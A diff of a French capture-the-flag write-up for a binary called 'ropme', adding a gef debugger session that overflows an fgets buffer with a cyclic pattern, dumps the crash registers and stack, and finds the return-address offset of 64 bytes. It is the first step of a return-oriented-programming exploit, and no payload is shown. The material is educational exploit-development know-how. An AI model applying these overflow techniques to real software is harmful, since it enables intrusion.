@@ -112,9 +112,67 @@ ROP me outside, how 'about dah?
 
 Ici la fonction fgets ne vérifie pas le nombre d'octets entrée par l'utilisateur du programme. Par conséquent nous avons pu faire segfault le binaire avec une saisie trop importante par rapport à l'espace alloué par le buffer.
 
-Ensuite, comme dans un buffer overflow basique nous devons récupérer l'offset afin d'overwrite nos registres avec une adresse valide à la place de nos "A".
-Dans la fonction main on peut observer que le buffer est alloué à cette instruction : `0x0000000000400655 <+47>:	lea    rax,[rbp-0x40]`.<br/>
-0x40 est égal à 64 en décimal (`gef➤  p/d 0x40  $1 = 64`), donc 64 octets sont alloués dans la pile, les 8 octets suivants seront la sauvegarde RBP de la précédente stack frame, et les 8 octets suivants seront l'adresse de retour (RIP).
+Ensuite, comme dans un buffer overflow basique nous devons récupérer l'offset afin d'overwrite nos registres avec une adresse valide à la place de nos "A", soit 0x41 en hexadécimal.
+
+
+```py
+gef➤  pattern create 100
+[+] Generating a pattern of 100 bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+[+] Saved as '$_gef0'
+gef➤  run
+Starting program: /home/nuts/ropme 
+ROP me outside, how 'about dah?
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040066c in main ()
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x0000000000400670  →  <__libc_csu_init+0> push r15
+$rcx   : 0x0000000000602715  →  0x0000000000000000
+$rdx   : 0x0               
+$rsp   : 0x00007fffffffdb78  →  "jaaaaaaakaaaaaaalaaaaaaamaaa\n"
+$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
+$rsi   : 0x00000000006026b1  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"
+$rdi   : 0x00007ffff7f844e0  →  0x0000000000000000
+$rip   : 0x000000000040066c  →  <main+70> ret 
+$r8    : 0x00007fffffffdb30  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
+$r9    : 0x00007ffff7f81a60  →  0x0000000000602ab0  →  0x0000000000000000
+$r10   : 0x40              
+$r11   : 0x246             
+$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdb78│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa\n"	 ← $rsp
+0x00007fffffffdb80│+0x0008: "kaaaaaaalaaaaaaamaaa\n"
+0x00007fffffffdb88│+0x0010: "laaaaaaamaaa\n"
+0x00007fffffffdb90│+0x0018: 0x0000000a6161616d ("maaa\n"?)
+0x00007fffffffdb98│+0x0020: 0x00007fffffffe039  →  0x0ba53f89a8f5d8c3
+0x00007fffffffdba0│+0x0028: 0x0000000000400670  →  <__libc_csu_init+0> push r15
+0x00007fffffffdba8│+0x0030: 0xd97e9c55920317fc
+0x00007fffffffdbb0│+0x0038: 0x0000000000400530  →  <_start+0> xor ebp, ebp
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400661 <main+59>        call   0x400500 <fgets@plt>
+     0x400666 <main+64>        mov    eax, 0x0
+     0x40066b <main+69>        leave  
+ →   0x40066c <main+70>        ret    
+[!] Cannot disassemble from $PC
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "ropme", stopped 0x40066c in main (), reason: SIGSEGV
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x40066c → main()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  pattern search iaaaaaaa
+[+] Searching 'iaaaaaaa'
+[+] Found at offset 64 (little-endian search)
+```
 
 Un ret2libc afin d'exécuter un shellcode dans la stack aurait été suffisante si le bit NX n'était pas activé, cependant ce n'est pas le cas, ainsi que l'ASLR est activé sur le serveur distant :
 
